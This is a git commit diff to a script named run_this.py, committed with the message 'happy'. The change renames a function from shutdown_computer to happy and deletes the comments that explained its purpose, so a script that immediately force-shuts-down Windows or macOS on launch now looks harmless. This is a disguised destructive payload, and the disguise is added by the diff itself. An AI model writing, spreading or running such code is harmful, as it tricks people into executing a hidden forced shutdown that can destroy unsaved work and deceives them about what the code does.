b1d43749139ad26c4e0c830ca6b7a0956a36e55e
amt0r <mr.felchin@gmail.com>
2024-12-28 19:13:01 +0200

    happy

--- run_this.py
+++ run_this.py
@@ -2,19 +2,13 @@ import os
 import platform
 
 
-def shutdown_computer():
-    # Перевірка операційної системи
+def happy():
     current_os = platform.system()
 
     if current_os == "Windows":
-        # Для Windows
         os.system("shutdown /s /f /t 0")
     elif current_os == "Darwin":
-        # Для macOS
         os.system("sudo shutdown -h now")
-    else:
-        print("Unsupported OS")
 
 
-# Викликаємо функцію для вимикання комп'ютера
-shutdown_computer()
+happy()
